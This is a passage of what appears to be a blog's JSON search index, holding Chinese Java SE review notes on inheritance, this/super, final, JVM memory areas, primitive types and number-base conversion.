2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错 3、是多态的前提 继承的弊端： 1、耦合性非常强，父类有的一些属性可能是子类不需要的 开发原则： 高内聚、低耦合 耦合：类与类的关系 内聚：自己完成某件事的能力 在java中继承的特点： 1、Java只支持单继承不支持多继承（一个孩子只能有一个爹） 2、可以多层继承（继承体系），也就是可以继承爷爷 3、想看这个体系所有功能就看最底层类，也就是儿子类 4、想看这个体系共性功能就要看顶层类，也就是爷爷类 注意事项 1、子类只能继承父类所有非私有的成员（方法和变量） 2、子类不能继承父类的构造方法，因为构造方法必须和类名一样，而继承是不一样的，但可以通过super关键字去访问父类的构造方法 3、不要为了部分功能而去继承，因为继承体现的是一种关系，就算有相同属性也不一定继承。 比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。 4、子父类如果出现相同变量那么会采取就近原则，但是在真正的项目开发中不会出现这种情况，因为没有意义 5、子类无论如何都会访问父类中的构造方法 6、在全是静态方法的类中，构造方法必须私有化，这样防止别人创建这个类的对象 this和super this： 代表当前对象的引用，如果继承了父类，那么也可以引用父类 super： 代表对父类的引用 一些使用实例： this.成员变量名 调用本类成员变量，也可以调用父类的，但是采用就近原则 super.成员变量名 调用父类的成员变量 ps：成员变量名可以是方法名 调用父类中的构造方法: 1super(...); 调用本类中的构造方法: 1this(...); ps：一个方法里只能调用其中的一个 注意事项 类中的构造方法系统都自带super()；但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以super（参数1，参数2....）；也可以用this调用本类的有参构造，进而间接调用父类有参构造 构造方法的调用都是从上到下，即从父类调用到子类，可以理解为一个队列 继承中的面试 1、假设有 子类方法、子类、父类 且其中都有一个num的变量，那么：num用方法中的变量，this.num调用本类中的变量，super.num调用父类中的变量 2、在继承中不要忘记了每个构造方法都会有一个super（）；访问父类 3、override 重写：子类中出现了和父类中方法声明一模一样的方法。与返回值类型有关,返回值类型是一致的 4、overload 重载：本类中出现的方法名一样，参数列表不同的方法。与返回值类型无关。 继承中的成员方法关系 、子、父类有相同方法并且返回值类型也一样，那么会调用子类的方法，也叫方法重写 final概述 它可以用来修饰 类与变量 修饰之后表示它是“最终的”不能被继续操作了 final修饰特点 修饰类，类不能被继承 修饰变量：变量就变成了常量，只能被赋值一次，通常与public static配套使用 修饰方法：方法不能被重写，表示最终方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"代码块","slug":"代码块","permalink":"http://liuhaoan.github.io/tags/代码块/"}]},{"title":"javaSE复习之——java的五大内存区域","slug":"javaSE复习之——java的五大内存区域","date":"2019-04-05T15:40:17.000Z","updated":"2019-04-08T12:27:31.029Z","comments":true,"path":"2019/04/05/javaSE复习之——java的五大内存区域/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——java的五大内存区域/","excerpt":"五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆","text":"五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆 Java程序运行过程 1、加载字节码文件到方法区（.class文件） 2、程序代码依次进栈（jvm执行main方法） 堆（heap）： 最大的一块内存，存放对象实例的地方 1、Java堆是垃圾收集器管理的主要区域，也称GC堆。 2、Java堆物理上可不连续，逻辑上连续。 3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常 虚拟机栈（stack）： java方法执行时的内存模型 栈帧 1、每个方法都会在虚拟机栈中创建一个对应的栈帧，用于存储局部变量表，操作数栈，动态链接，方法出口等信息。 2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈入栈到出栈。 局部变量表 1、存放编译期可知在方法中各种基本数据类型和对象的引用，基本数据类型直接存值, 引用数据类型存地址。 #本地方法栈： 本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务 本地方法 关键字 native ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。 有的虚拟机将本地方法栈和虚拟机栈合在一起，如HotSpot。 方法区： 存已经被虚拟机加载的类信息（Class对象）、常量、静态变量、即时编译器JIT编译过后的代码数据。 jdk 1.7、1.8 对方法区做出了修改，1.8 取消了方法区。 1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap 2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。 3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。 运行时常量池 1、在方法区，用来存放编译期生成的各种符号引用和字面量 2、编译期将各种符号引用和字面量放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时复制到局部变量表中。1.7开始字符串常量池被移入堆中。 符号引用： String ss = “asdsfg” ss这个符号就是符号引用。解析阶段解析为直接引用 字面量： 值本身 如 asdfg 常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。 寄存器（程序计数器）： 占用较小的一块内存空间，当执行Java方法时记录正在执行的虚拟机字节码指令地址，如果执行Native方法则计时器值为空。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"javaSE","slug":"javaSE","permalink":"http://liuhaoan.github.io/tags/javaSE/"}]},{"title":"javaSE复习之——数据类型","slug":"javaSE复习之——数据类型","date":"2019-04-05T12:47:43.000Z","updated":"2019-04-08T11:51:09.510Z","comments":true,"path":"2019/04/05/javaSE复习之——数据类型/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——数据类型/","excerpt":"基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D","text":"基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D 整数型（整数常亮默认为int类型） byte：占一个字节 -128 ~ 127 short：占两个字节 -2^15 ~ 2^15-1 int：占四个字节 -2^31 ~ 2^31-1 long：占八个字节 -2^63 ~ 2^63-1 浮点型（小数型，默认小数是double类型） float：占四个字节 -2^128 ~ 2^128 绝对保证精度6位，但有7位有效数字 double：占八个字节 -2^1024 ~ 2^1024 绝对保证精度15位，但有16位有效数字 字符型 char：占两个字节 0 ~ 65535 布尔型（判断） boolean：理论八分之一字节，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小 ps：float由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"数据类型","slug":"数据类型","permalink":"http://liuhaoan.github.io/tags/数据类型/"}]},{"title":"javaSE复习之——进制编码","slug":"javaSE复习之——进制编码","date":"2019-04-05T12:27:44.000Z","updated":"2019-04-08T11:49:23.610Z","comments":true,"path":"2019/04/05/javaSE复习之——进制编码/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——进制编码/","excerpt":"进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 &amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0","text":"进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 &amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0 java中的数据表示法 在java中数据前面加 0x表示16进制 0b表示二进制 0表示8进制 进制转换 任何进制转10进制都是 每一位 第某位的数据 乘 被转换的进制数 的 第某位索引次幂 相加 例子八转10：10120=1 * 8 ^ 2 + 2 * 8 ^ 1 + 0 * 8 ^ 0 = 80 10进制转任何进制都是 除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 余数列表的从下到上 2、8互转与2、16互转方法： 2转8 = 3位一组转8 8转2 = 每一位转2 2转16 = 4位一组转16 16转2 = 每一位转2 二进制快速转换10进制方法： 二进制：1 1 1 1 1 1 1 1 十进制：128 64 32 16 8 4 2 1 二进制表示法: 符号位0为正，1为负 计算机二进制运算原理 计算机二进制运算都是用补码 例子： +7 的原码是 0 0000111 ps：正数的、原码、反码、补码都一样 -7 的原码为 1 0000111 反码为 1 1111000 （符号位不变） 补码为 1 1111001（在反码的基础上加1）","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"进制编码","slug":"进制编码","permalink":"http://liuhaoan.github.io/tags/进制编码/"}]}]}